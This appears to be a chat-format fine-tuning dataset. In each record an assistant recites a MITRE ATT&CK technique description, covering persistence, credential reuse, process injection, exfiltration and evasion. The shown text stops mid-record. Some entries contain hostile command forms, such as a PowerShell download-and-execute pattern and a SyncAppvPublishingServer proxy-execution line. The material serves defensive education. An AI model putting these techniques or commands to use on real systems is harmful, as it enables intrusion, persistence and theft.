{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Re-opened Applications' and with the Id: T1547.007 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Re-opened Applications' and with the Id: T1547.007 is described as follows: Adversaries may modify plist files to automatically run an application when a user logs in. When a user logs out or restarts via the macOS Graphical User Interface (GUI), a prompt is provided to the user with a checkbox to \"Reopen windows when logging back in\".(Citation: Re-Open windows on Mac) When selected, all applications currently open are added to a property list file named <code>com.apple.loginwindow.[UUID].plist</code> within the <code>~/Library/Preferences/ByHost</code> directory.(Citation: Methods of Mac Malware Persistence)(Citation: Wardle Persistence Chapter) Applications listed in this file are automatically reopened upon the user\u2019s next logon.Adversaries can establish [Persistence](https://attack.mitre.org/tactics/TA0003) by adding a malicious application path to the <code>com.apple.loginwindow.[UUID].plist</code> file to execute payloads when a user logs in.. The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'SEO Poisoning' and with the Id: T1608.006 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'SEO Poisoning' and with the Id: T1608.006 is described as follows: Adversaries may poison mechanisms that influence search engine optimization (SEO) to further lure staged capabilities towards potential victims. Search engines typically display results to users based on purchased ads as well as the site\u2019s ranking/score/reputation calculated by their web crawlers and algorithms.(Citation: Atlas SEO)(Citation: MalwareBytes SEO)To help facilitate [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), adversaries may stage content that explicitly manipulates SEO rankings in order to promote sites hosting their malicious payloads (such as [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)) within search engines. Poisoning SEO rankings may involve various tricks, such as stuffing keywords (including in the form of hidden text) into compromised sites. These keywords could be related to the interests/browsing habits of the intended victim(s) as well as more broad, seasonably popular topics (e.g. elections, trending news).(Citation: ZScaler SEO)(Citation: Atlas SEO)Adversaries may also purchase or plant incoming links to staged capabilities in order to boost the site\u2019s calculated relevance and reputation.(Citation: MalwareBytes SEO)(Citation: DFIR Report Gootloader)SEO poisoning may also be combined with evasive redirects and other cloaking mechanisms (such as measuring mouse movements or serving content based on browser user agents, user language/localization settings, or HTTP headers) in order to feed SEO inputs while avoiding scrutiny from defenders.(Citation: ZScaler SEO)(Citation: Sophos Gootloader). The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Pass the Hash' and with the Id: T1550.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Pass the Hash' and with the Id: T1550.002 is described as follows: Adversaries may \u201cpass the hash\u201d using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.When performing PtH, valid password hashes for the account being used are captured using a [Credential Access](https://attack.mitre.org/tactics/TA0006) technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.Adversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) attacks.(Citation: Stealthbits Overpass-the-Hash). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exfiltration Over Physical Medium' and with the Id: T1052 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exfiltration Over Physical Medium' and with the Id: T1052 is described as follows: Adversaries may attempt to exfiltrate data via a physical medium, such as a removable drive. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'DLL Side-Loading' and with the Id: T1574.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'DLL Side-Loading' and with the Id: T1574.002 is described as follows: Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).Side-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.(Citation: FireEye DLL Side-Loading). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Ingress Tool Transfer' and with the Id: T1105 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Ingress Tool Transfer' and with the Id: T1105 is described as follows: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). On Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160), and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)Adversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution](https://attack.mitre.org/techniques/T1204) (typically after interacting with [Phishing](https://attack.mitre.org/techniques/T1566) lures).(Citation: T1105: Trellix_search-ms)Files can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016) In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.(Citation: Dropbox Malware Sync). The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'SyncAppvPublishingServer' and with the Id: T1216.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'SyncAppvPublishingServer' and with the Id: T1216.002 is described as follows: Adversaries may abuse SyncAppvPublishingServer.vbs to proxy execution of malicious [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands. SyncAppvPublishingServer.vbs is a Visual Basic script associated with how Windows virtualizes applications (Microsoft Application Virtualization, or App-V).(Citation: 1 - appv) For example, Windows may render Win32 applications to users as virtual applications, allowing users to launch and interact with them as if they were installed locally.(Citation: 2 - appv)(Citation: 3 - appv)    The SyncAppvPublishingServer.vbs script is legitimate, may be signed by Microsoft, and is commonly executed from `\\System32` through the command line via `wscript.exe`.(Citation: 4 - appv)(Citation: 5 - appv)Adversaries may abuse SyncAppvPublishingServer.vbs to bypass [PowerShell](https://attack.mitre.org/techniques/T1059/001) execution restrictions and evade defensive counter measures by \"living off the land.\"(Citation: 6 - appv)(Citation: 4 - appv) Proxying execution may function as a trusted/signed alternative to directly invoking `powershell.exe`.(Citation: 7 - appv)For example,  [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands may be invoked using:(Citation: 5 - appv)`SyncAppvPublishingServer.vbs \"n; {PowerShell}\"`. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Additional Email Delegate Permissions' and with the Id: T1098.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Additional Email Delegate Permissions' and with the Id: T1098.002 is described as follows: Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account. For example, the <code>Add-MailboxPermission</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.(Citation: Microsoft - Add-MailboxPermission)(Citation: FireEye APT35 2018)(Citation: Crowdstrike Hiding in Plain Sight 2018) In Google Workspace, delegation can be enabled via the Google Admin console and users can delegate accounts via their Gmail settings.(Citation: Gmail Delegation)(Citation: Google Ensuring Your Information is Safe) Adversaries may also assign mailbox folder permissions through individual folder permissions or roles. In Office 365 environments, adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store (root), Inbox, or other mailbox folders. By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target user\u2019s mail folders.(Citation: Mandiant Defend UNC2452 White Paper)This may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can add [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)), so the messages evade spam/phishing detection mechanisms.(Citation: Bienstock, D. - Defending O365 - 2019). The systems targeted by this attack pattern are: Windows, Office 365, Google Workspace ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Code Signing Certificates' and with the Id: T1588.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Code Signing Certificates' and with the Id: T1588.003 is described as follows: Adversaries may buy and/or steal code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.Prior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may purchase or steal code signing certificates for use in operations. The purchase of code signing certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal code signing materials directly from a compromised third-party.. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Network Share Connection Removal' and with the Id: T1126 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Network Share Connection Removal' and with the Id: T1126 is described as follows: Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) connections can be removed when no longer needed. [Net](https://attack.mitre.org/software/S0039) is an example utility that can be used to remove network share connections with the <code>net use \\\\system\\share /delete</code> command. (Citation: Technet Net Use). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Serverless Execution' and with the Id: T1648 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Serverless Execution' and with the Id: T1648 is described as follows: Adversaries may abuse serverless computing, integration, and automation services to execute arbitrary code in cloud environments. Many cloud providers offer a variety of serverless resources, including compute engines, application integration services, and web servers. Adversaries may abuse these resources in various ways as a means of executing arbitrary commands. For example, adversaries may use serverless functions to execute malicious code, such as crypto-mining malware (i.e. [Resource Hijacking](https://attack.mitre.org/techniques/T1496)).(Citation: Cado Security Denonia) Adversaries may also create functions that enable further compromise of the cloud environment. For example, an adversary may use the `IAM:PassRole` permission in AWS or the `iam.serviceAccounts.actAs` permission in Google Cloud to add [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) to a serverless cloud function, which may then be able to perform actions the original user cannot.(Citation: Rhino Security Labs AWS Privilege Escalation)(Citation: Rhingo Security Labs GCP Privilege Escalation)Serverless functions can also be invoked in response to cloud events (i.e. [Event Triggered Execution](https://attack.mitre.org/techniques/T1546)), potentially enabling persistent execution over time. For example, in AWS environments, an adversary may create a Lambda function that automatically adds [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) to a user and a corresponding CloudWatch events rule that invokes that function whenever a new user is created.(Citation: Backdooring an AWS account) Similarly, an adversary may create a Power Automate workflow in Office 365 environments that forwards all emails a user receives or creates anonymous sharing links whenever a user is granted access to a document in SharePoint.(Citation: Varonis Power Automate Data Exfiltration)(Citation: Microsoft DART Case Report 001). The systems targeted by this attack pattern are: SaaS, IaaS, Office 365 ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'TCC Manipulation' and with the Id: T1548.006 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'TCC Manipulation' and with the Id: T1548.006 is described as follows: Adversaries can manipulate or abuse the Transparency, Consent, & Control (TCC) service or database to execute malicious applications with elevated permissions. TCC is a Privacy & Security macOS control mechanism used to determine if the running process has permission to access the data or services protected by TCC, such as screen sharing, camera, microphone, or Full Disk Access (FDA).When an application requests to access data or a service protected by TCC, the TCC daemon (`tccd`) checks the TCC database, located at `/Library/Application Support/com.apple.TCC/TCC.db` (and `~/` equivalent), for existing permissions. If permissions do not exist, then the user is prompted to grant permission. Once permissions are granted, the database stores the application's permissions and will not prompt the user again unless reset. For example, when a web browser requests permissions to the user's webcam, once granted the web browser may not explicitly prompt the user again.(Citation: welivesecurity TCC)Adversaries may manipulate the TCC database or otherwise abuse the TCC service to execute malicious content. This can be done in various ways, including using privileged system applications to execute malicious payloads or manipulating the database to grant their application TCC permissions. For example, adversaries can use Finder, which has FDA permissions by default, to execute malicious [AppleScript](https://attack.mitre.org/techniques/T1059/002) while preventing a user prompt. For a system without System Integrity Protection (SIP) enabled, adversaries have also manipulated the operating system to load an adversary controlled TCC database using environment variables and [Launchctl](https://attack.mitre.org/techniques/T1569/001).(Citation: TCC macOS bypass)(Citation: TCC Database)Adversaries may also opt to instead inject code (e.g., [Process Injection](https://attack.mitre.org/techniques/T1055)) into targeted applications with the desired TCC permissions.. The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Windows Management Instrumentation Event Subscription' and with the Id: T1084 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Windows Management Instrumentation Event Subscription' and with the Id: T1084 is described as follows: Windows Management Instrumentation (WMI) can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. Adversaries may attempt to evade detection of this technique by compiling WMI scripts into Windows Management Object (MOF) files (.mof extension). (Citation: Dell WMI Persistence) Examples of events that may be subscribed to are the wall clock time or the computer's uptime. (Citation: Kazanciyan 2014) Several threat groups have reportedly used this technique to maintain persistence. (Citation: Mandiant M-Trends 2015). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Launch Daemon' and with the Id: T1160 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Launch Daemon' and with the Id: T1160 is described as follows: Per Apple\u2019s developer documentation, when macOS and OS X boot up, launchd is run to finish system initialization. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in <code>/System/Library/LaunchDaemons</code> and <code>/Library/LaunchDaemons</code> (Citation: AppleDocs Launch Agent Daemons). These LaunchDaemons have property list files which point to the executables that will be launched (Citation: Methods of Mac Malware Persistence). Adversaries may install a new launch daemon that can be configured to execute at startup by using launchd or launchctl to load a plist into the appropriate directories (Citation: OSX Malware Detection). The daemon name may be disguised by using a name from a related operating system or benign software  (Citation: WireLurker). Launch Daemons may be created with administrator privileges, but are executed under root privileges, so an adversary may also use a service to escalate privileges from administrator to root. The plist file permissions must be root:wheel, but the script or program that it points to has no such requirement. So, it is possible for poor configurations to allow an adversary to modify a current Launch Daemon\u2019s executable and gain persistence or Privilege Escalation.. The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Ptrace System Calls' and with the Id: T1055.008 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Ptrace System Calls' and with the Id: T1055.008 is described as follows: Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process. Ptrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values.(Citation: PTRACE man) Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex: <code>malloc</code>) then invoking that memory with <code>PTRACE_SETREGS</code> to set the register containing the next instruction to execute. Ptrace system call injection can also be done with <code>PTRACE_POKETEXT</code>/<code>PTRACE_POKEDATA</code>, which copy data to a specific address in the target processes\u2019 memory (ex: the current address of the next instruction). (Citation: PTRACE man)(Citation: Medium Ptrace JUL 2018) Ptrace system call injection may not be possible targeting processes that are non-child processes and/or have higher-privileges.(Citation: BH Linux Inject) Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process. . The systems targeted by this attack pattern are: Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Power Settings' and with the Id: T1653 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Power Settings' and with the Id: T1653 is described as follows: Adversaries may impair a system's ability to hibernate, reboot, or shut down in order to extend access to infected machines. When a computer enters a dormant state, some or all software and hardware may cease to operate which can disrupt malicious activity.(Citation: Sleep, shut down, hibernate)Adversaries may abuse system utilities and configuration settings to maintain access by preventing machines from entering a state, such as standby, that can terminate malicious activity.(Citation: Microsoft: Powercfg command-line options)(Citation: systemdsleep Linux)For example, `powercfg` controls all configurable power system settings on a Windows system and can be abused to prevent an infected host from locking or shutting down.(Citation: Two New Monero Malware Attacks Target Windows and Android Users) Adversaries may also extend system lock screen timeout settings.(Citation: BATLOADER: The Evasive Downloader Malware) Other relevant settings, such as disk and hibernate timeout, can be similarly abused to keep the infected machine running even if no user is active.(Citation: CoinLoader: A Sophisticated Malware Loader Campaign)Aware that some malware cannot survive system reboots, adversaries may entirely delete files used to invoke system shut down or reboot.(Citation: Condi-Botnet-binaries). The systems targeted by this attack pattern are: Windows, Linux, macOS, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Dynamic API Resolution' and with the Id: T1027.007 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Dynamic API Resolution' and with the Id: T1027.007 is described as follows: Adversaries may obfuscate then dynamically resolve API functions called by their malware in order to conceal malicious functionalities and impair defensive analysis. Malware commonly uses various [Native API](https://attack.mitre.org/techniques/T1106) functions provided by the OS to perform various tasks such as those involving processes, files, and other system artifacts.API functions called by malware may leave static artifacts such as strings in payload files. Defensive analysts may also uncover which functions a binary file may execute via an import address table (IAT) or other structures that help dynamically link calling code to the shared modules that provide functions.(Citation: Huntress API Hash)(Citation: IRED API Hashing)To avoid static or other defensive analysis, adversaries may use dynamic API resolution to conceal malware characteristics and functionalities. Similar to [Software Packing](https://attack.mitre.org/techniques/T1027/002), dynamic API resolution may change file signatures and obfuscate malicious API function calls until they are resolved and invoked during runtime.Various methods may be used to obfuscate malware calls to API functions. For example, hashes of function names are commonly stored in malware in lieu of literal strings. Malware can use these hashes (or other identifiers) to manually reproduce the linking and loading process using functions such as `GetProcAddress()` and `LoadLibrary()`. These hashes/identifiers can also be further obfuscated using encryption or other string manipulation tricks (requiring various forms of [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) during execution).(Citation: BlackHat API Packers)(Citation: Drakonia HInvoke)(Citation: Huntress API Hash). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Remote Desktop Protocol' and with the Id: T1021.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Remote Desktop Protocol' and with the Id: T1021.001 is described as follows: Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services) Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1546/008) or [Terminal Services DLL](https://attack.mitre.org/techniques/T1505/005) for Persistence.(Citation: Alperovitch Malware). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Logon Script (Windows)' and with the Id: T1037.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Logon Script (Windows)' and with the Id: T1037.001 is described as follows: Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system.(Citation: TechNet Logon Scripts) This is done via adding a path to a script to the <code>HKCU\\Environment\\UserInitMprLogonScript</code> Registry key.(Citation: Hexacorn Logon Scripts)Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. . The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'ListPlanting' and with the Id: T1055.015 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'ListPlanting' and with the Id: T1055.015 is described as follows: Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. ListPlanting is a method of executing arbitrary code in the address space of a separate live process. Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.List-view controls are user interface windows used to display collections of items.(Citation: Microsoft List View Controls) Information about an application's list-view settings are stored within the process' memory in a <code>SysListView32</code> control.ListPlanting (a form of message-passing \"shatter attack\") may be performed by copying code into the virtual address space of a process that uses a list-view control then using that code as a custom callback for sorting the listed items.(Citation: Modexp Windows Process Injection) Adversaries must first copy code into the target process\u2019 memory space, which can be performed various ways including by directly obtaining a handle to the <code>SysListView32</code> child of the victim process window (via Windows API calls such as <code>FindWindow</code> and/or <code>EnumWindows</code>) or other [Process Injection](https://attack.mitre.org/techniques/T1055) methods.Some variations of ListPlanting may allocate memory in the target process but then use window messages to copy the payload, to avoid the use of the highly monitored <code>WriteProcessMemory</code> function. For example, an adversary can use the <code>PostMessage</code> and/or <code>SendMessage</code> API functions to send <code>LVM_SETITEMPOSITION</code> and <code>LVM_GETITEMPOSITION</code> messages, effectively copying a payload 2 bytes at a time to the allocated memory.(Citation: ESET InvisiMole June 2020) Finally, the payload is triggered by sending the <code>LVM_SORTITEMS</code> message to the <code>SysListView32</code> child of the process window, with the payload within the newly allocated buffer passed and executed as the <code>ListView_SortItems</code> callback.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Hide Infrastructure' and with the Id: T1665 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Hide Infrastructure' and with the Id: T1665 is described as follows: Adversaries may manipulate network traffic in order to hide and evade detection of their C2 infrastructure. This can be accomplished in various ways including by identifying and filtering traffic from defensive tools,(Citation: TA571) masking malicious domains to obfuscate the true destination from both automated scanning tools and security researchers,(Citation: Schema-abuse)(Citation: Facad1ng)(Citation: Browser-updates) and otherwise hiding malicious artifacts to delay discovery and prolong the effectiveness of adversary infrastructure that could otherwise be identified, blocked, or taken down entirely.C2 networks may include the use of [Proxy](https://attack.mitre.org/techniques/T1090) or VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections. For example, an adversary may use a virtual private cloud to spoof their IP address to closer align with a victim's IP address ranges. This may also bypass security measures relying on geolocation of the source IP address.(Citation: sysdig)(Citation: Orange Residential Proxies)Adversaries may also attempt to filter network traffic in order to evade defensive tools in numerous ways, including blocking/redirecting common incident responder or security appliance user agents.(Citation: mod_rewrite)(Citation: SocGholish-update) Filtering traffic based on IP and geo-fencing may also avoid automated sandboxing or researcher activity (i.e., [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)).(Citation: TA571)(Citation: mod_rewrite)Hiding C2 infrastructure may also be supported by [Resource Development](https://attack.mitre.org/tactics/TA0042) activities such as [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) and [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584). For example, using widely trusted hosting services or domains such as prominent URL shortening providers or marketing services for C2 networks may enable adversaries to present benign content that later redirects victims to malicious web pages or infrastructure once specific conditions are met.(Citation: StarBlizzard)(Citation: QR-cofense). The systems targeted by this attack pattern are: macOS, Windows, Linux, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Domain or Tenant Policy Modification' and with the Id: T1484 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Domain or Tenant Policy Modification' and with the Id: T1484 is described as follows: Adversaries may modify the configuration settings of a domain or identity tenant to evade defenses and/or escalate privileges in centrally managed environments. Such services provide a centralized means of managing identity resources such as devices and accounts, and often include configuration settings that may apply between domains or tenants such as trust relationships, identity syncing, or identity federation.Modifications to domain or tenant settings may include altering domain Group Policy Objects (GPOs) in Microsoft Active Directory (AD) or changing trust settings for domains, including federation trusts relationships between domains or tenants.With sufficient permissions, adversaries can modify domain or tenant policy settings. Since configuration settings for these services apply to a large number of identity resources, there are a great number of potential attacks malicious outcomes that can stem from this abuse. Examples of such abuse include:  * modifying GPOs to push a malicious [Scheduled Task](https://attack.mitre.org/techniques/T1053/005) to computers throughout the domain environment(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)* modifying domain trusts to include an adversary-controlled domain, allowing adversaries to  forge access tokens that will subsequently be accepted by victim domain resources(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks)* changing configuration settings within the AD environment to implement a [Rogue Domain Controller](https://attack.mitre.org/techniques/T1207).* adding new, adversary-controlled federated identity providers to identity tenants, allowing adversaries to authenticate as any user managed by the victim tenant (Citation: Okta Cross-Tenant Impersonation 2023)Adversaries may temporarily modify domain or tenant policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.. The systems targeted by this attack pattern are: Windows, Azure AD, SaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'XSL Script Processing' and with the Id: T1220 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'XSL Script Processing' and with the Id: T1220 is described as follows: Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)Command-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass 